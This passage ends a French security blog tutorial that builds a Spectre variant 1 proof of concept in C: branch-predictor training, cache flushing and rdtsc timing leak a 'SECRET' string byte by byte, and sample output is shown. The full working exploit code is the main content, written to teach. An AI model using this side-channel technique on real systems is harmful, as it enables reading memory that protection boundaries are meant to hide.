<p>Encore une fois, ce code est très fourni en commentaires pour expliquer tous les mécanismes et les ajouts pour des cas particuliers. La sortie de ce programme est :</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pixis@hackndo:~/spectre$ gcc -O0 poc_leak_one_byte.c -o poc_leak_one_byte &amp;&amp; ./poc_leak_one_byte
    CACHE MEM CYCLES    HIT
---------------------------
[ ]    0  100   279 - A: 0
[ ]    0  100   292 - B: 0
[ ]    0  100   284 - C: 0
[ ]    0  100   288 - D: 0
[ ]    0  100   285 - E: 0
[ ]    0  100   288 - F: 0
[ ]    0  100   295 - G: 0
[ ]    0  100   284 - H: 0
[ ]    0  100   275 - I: 0
[ ]    0  100   264 - J: 0
[ ]    0  100   284 - K: 0
[ ]    0  100   258 - L: 0
[ ]    0  100   256 - M: 0
[ ]    0  100   267 - N: 0
[ ]    0  100   265 - O: 0
[ ]    0  100   277 - P: 0
[ ]    0  100   282 - Q: 0
[ ]    0  100   303 - R: 0
[*]   99    1    38 - S: 1
[ ]    0  100   275 - T: 0
[ ]    1   99   288 - U: 0
[ ]    0  100   300 - V: 0
[ ]    0  100   282 - W: 0
[ ]    0  100   276 - X: 0
[ ]    0  100   309 - Y: 0
[ ]    0  100   306 - Z: 0
</code></pre></div></div>

<p>Le programme indique donc que le premier octet du secret est un S ! C’est presque gagné pour finir le travail.</p>

<h2 id="poc-final-pour-trouver-le-secret">PoC final pour trouver le secret</h2>

<p>Le dernier programme est presque complet. Il ne reste plus qu’à boucler un certain nombre de fois pour avoir le secret en entier.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 ** CODE DE LA VICTIME
 **/</span>

<span class="cm">/* Buffer maitrisé, des valeurs étant entre 0 et 255 */</span>
<span class="kt">int</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">};</span>

<span class="cm">/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */</span>
<span class="kt">char</span> <span class="o">*</span> <span class="n">secret</span> <span class="o">=</span> <span class="s">"SECRET"</span><span class="p">;</span>

<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">my_protected_function</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 &lt;= buffer[idx] &lt;= 255
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">buffer_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="n">buffer</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/**
 ** CODE DE L'ATTAQUANT
 **/</span>


<span class="cm">/* Initialisation du buffer de 256 pages */</span>
<span class="kt">char</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>

<span class="cm">/* Le programme va entraîner 10 fois le processeur à prendre la branche puis changera d'index */</span>
<span class="cp">#define TRAIN 10
</span><span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">flush</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// On supprime la page de tous les niveaux de cache</span>

    <span class="cm">/* Un index valide est utilisé pour l'entraînement */</span>
    <span class="kt">int</span> <span class="n">valid_idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">TRAIN</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">my_protected_function</span><span class="p">(</span><span class="n">valid_idx</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
     * On accède ensuite à une zone mémoire qui n'est plus autorisée normalement
     * On va utiliser un index soigneusement choisi pour que la zone mémoire qui sera
     * accédée soit le premier octet du secret
     */</span>
    <span class="n">my_protected_function</span><span class="p">(</span><span class="n">evil_idx</span><span class="p">);</span>

    <span class="cm">/*
     * La prédiction de branche devrait avoir lu la valeur du premier octet du secret 'S' ou 83 en décimal,
     * puis a dû accéder à l'index du tableau de page, mettant en cache la page à l'index 83.
     * Comme le processeur se rend compte de son erreur, les changements sont annulés, mais la mise
     * en cache existe encore. On va donc pouvoir mesurer les temps d'accès pour trouver cette fameuse
     * valeur.
     * Il faut faire cet entraînement pour chaque octet testé dans la boucle de la fonction main
     * Au moment où la boucle sera à 83 ou 'S' les instructions suivantes montreront que la valeur est en cache
     * On saura alors que le premier octet du secret est un 'S'
     */</span>

    <span class="kt">int</span> <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
    <span class="n">access</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// Accès à la zone mémoire</span>
    <span class="kt">int</span> <span class="n">after</span>  <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge suite à l'accès mémoire</span>
    <span class="k">return</span> <span class="n">after</span> <span class="o">-</span> <span class="n">before</span><span class="p">;</span> <span class="c1">// On retourne la différence pour avoir le temps d'accès</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Pour toutes les pages du buffer, on calcule le temps d'accès */</span>
    <span class="kt">int</span> <span class="n">evil_idx</span> <span class="o">=</span> <span class="mh">0x12bb36f1</span><span class="p">;</span> <span class="c1">// Exemple au hasard, c'est pour simplifier le code</span>

    <span class="cm">/* On boucle sur la longueur du secret pour tout révéler */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">longueur_secret</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* Le premier argument, c'est l'index permettant d'atteindre le premier octet du secret */</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="n">evil_idx</span> <span class="o">+</span> <span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">));</span> <span class="c1">// On ajoute un à chaque boucle pour avoir tout le secret</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>La boucle est faite dans la fonction <code class="highlighter-rouge">main</code>, on incrémente l’index correspondant au secret pour avoir le secret en entier. C’est assez simple à implémenter avec le programme précédant. Voici ce que le programme final complet donne :</p>

<p><strong>poc_final.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;x86intrin.h&gt;
</span>
<span class="cp">#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"
</span>
<span class="cp">#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16
</span>


<span class="cm">/**
 ** CODE DE LA VICTIME
 **/</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">buffer_size</span> <span class="o">=</span> <span class="n">BUFFER_SIZE</span><span class="p">;</span>

<span class="cm">/* Buffer maitrisé, des valeurs étant entre 0 et 255 */</span>
<span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">};</span>

<span class="cm">/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */</span>
<span class="kt">char</span> <span class="o">*</span> <span class="n">secret</span> <span class="o">=</span> <span class="s">"SECRET"</span><span class="p">;</span>

<span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">paged_buffer_sz</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">my_protected_function</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 &lt;= buffer[idx] &lt;= 255
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">buffer_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="n">buffer</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/**
 ** CODE DE L'ATTAQUANT
 **/</span>
<span class="kt">void</span> <span class="nf">access_value</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Wrapper pour éviter les optimisations */</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">delay</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* Ne fait rien à part faire passer le temps */</span>
    <span class="kt">uint32_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="k">volatile</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">*=</span> <span class="n">i</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">^=</span> <span class="mi">444</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">*=</span> <span class="mi">555</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">#define TRAIN 30
#define FREQ 5
</span><span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">cycle_difference</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">access_time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_ram</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_cache</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* Récupère l'index de la page à laquelle on accède */</span>
    <span class="n">value</span> <span class="o">*=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

    <span class="cm">/* Boucle pour faire une moyenne sur COUNT accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">COUNT</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* Vidage du cache */</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">paged_buffer</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">));</span>
        <span class="p">}</span>
        
        <span class="cm">/* Index trx qui est dans les limites du tableau */</span>
        <span class="kt">uint32_t</span> <span class="n">trx</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">%</span> <span class="n">buffer_size</span><span class="p">;</span>

        <span class="cm">/* Entrainement de la branche */</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">TRAIN</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* On enlève la variable de taille du tableau du cache pour que la comparaison soit lente */</span>
            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer_size</span><span class="p">);</span>
            <span class="n">delay</span><span class="p">();</span>

            <span class="cm">/*
             * Trick emprunté de plusieurs PoC en ligne.
             * Il permet de faire une condition, sans pour autant ajouter des branches
             * L'ajout de branche risque d'annuler l'optimisation du processeur qui verrait
             * plusieurs chemin, donc n'entraînerait pas correctement son choix de branche.
             *
             * Le pseudo-code équivalent est le suivant
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Index d'attaque
             * } else {
             *     addr = trx; // Index dans le tableau
             * }
             * 
             * En faisant ceci, encore dans une optique de moyenne, toutes les FREQ itération
             * on va essayer de jouer sur la prédiction avec l'index du secret en paramètre
             * En faisant cela plusieurs fois, il devrait y avoir au moins une mise en cache
             */</span>

            <span class="kt">int</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="n">FREQ</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// addr = 0xffff0000 si i % FREQ == 0</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">|</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">));</span> <span class="c1">// addr = FFFF si i % FREQ == 0</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">trx</span> <span class="o">^</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">trx</span> <span class="o">^</span> <span class="n">idx</span><span class="p">));</span> <span class="c1">// addr = idx si i % FREQ == 0; sinon trx</span>

            <span class="n">my_protected_function</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">delay</span><span class="p">();</span>

        <span class="kt">int</span> <span class="n">before</span><span class="p">,</span> <span class="n">after</span><span class="p">;</span>

        <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
        <span class="n">access_value</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span><span class="p">]);</span> <span class="c1">// Accès à la page</span>
        <span class="n">_mm_lfence</span><span class="p">();</span> <span class="c1">// Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine</span>
        <span class="n">after</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>

        <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">after</span><span class="o">-</span><span class="n">before</span><span class="p">);</span> <span class="c1">// Nombre de cycles pour l'accès à la zone mémoire</span>

        <span class="n">access_time</span> <span class="o">+=</span> <span class="n">diff</span><span class="p">;</span>
        
        <span class="cm">/*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">diff</span> <span class="o">&gt;</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">in_ram</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">in_cache</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">get_all_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">get_index_access_time</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">paged_buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* Permet d'éviter une optimisation appelée lazy allocation */</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>

    <span class="cm">/*
     * L'index qu'on passe en argument sera utilisé de la manière suivante :
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * J'ai rappelé dans l'article sur meltdown et spectre que
     * buffer[idx]
     * était équivalent à
     * *(buffer + idx)
     * Donc pour accéder à l'adresse du premier octet de secret, on cherche
     * secret = buffer + idx
     * donc idx = secret - buffer
     * D'où le choix de l'argument dans l'instruction suivante.
     *
     * Le compteur est incrémenté pour avoir tous les octets du secret
     */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">get_all_access_time</span><span class="p">(</span><span class="n">secret</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="p">)</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>    
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce PoC final permet de récupérer la valeur complète du secret. En effet, en l’exécutant, voilà le secret tant attendu :</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pixis@hackndo:~/spectre$ gcc -O0 poc_final.c -o poc_final &amp;&amp; ./poc_final
SECRET
</code></pre></div></div>

<p>Vous trouverez tous les codes sources sur <a href="https://github.com/Hackndo/spectre-poc" target="blank">mon github</a>.</p>

<p>J’espère que cet article vous aide à y voir encore plus clair. Comme d’habitude, n’hésitez pas à commenter ou à me retrouver sur <a href="https://discord.gg/9At6SUZ" target="blank">Discord</a> pour plus d’informations, des remarques, des corrections, etc.</p>

<p>Je tenais à remercier <a href="https://twitter.com/gynvael" target="blank">Gynvael</a> pour le <a href="https://www.youtube.com/watch?v=0o6MoJ2gHHI" target="blank">live</a> qu’il a fait sur le sujet, me permettant de combler les trous manquant afin de terminer cet article.</p>

  </article>
</div>
<div class="keywords">
    <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a><a href="/archives/#hardware"><i class="fas fa-tags"></i> Hardware</a></span>
  </div>


<br />
<div class="box">
  <div class="dash">
    <div class="picture">
      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
    </div>
    <div class="box_content">
      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
    </div>
    
  </div>
</div>


<div class="related">
  <h2>Articles similaires</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/pass-the-hash/">
            Pass the Hash
            <small>18 Dec 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/remote-lsass-dump-passwords/">
            Extraction des secrets de lsass à distance
            <small>28 Nov 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/bloodhound/">
            BloodHound
            <small>30 Jul 2019</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>

<div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */
    
    var disqus_config = function () {
        this.page.url = 'http://localhost:4000/construction-poc-spectre/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = '0000-0000-0000-001f';
    };
    
    (function() {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        
        s.src = '//hackndo.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

        </div>
    </main>
    <script src="/assets/js/jquery-2.1.4.js"></script>
    <script src="/assets/js/jquery.menu-aim.js"></script>
    <script src="/assets/js/anchor.min.js"></script>
    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
  </body>
</html>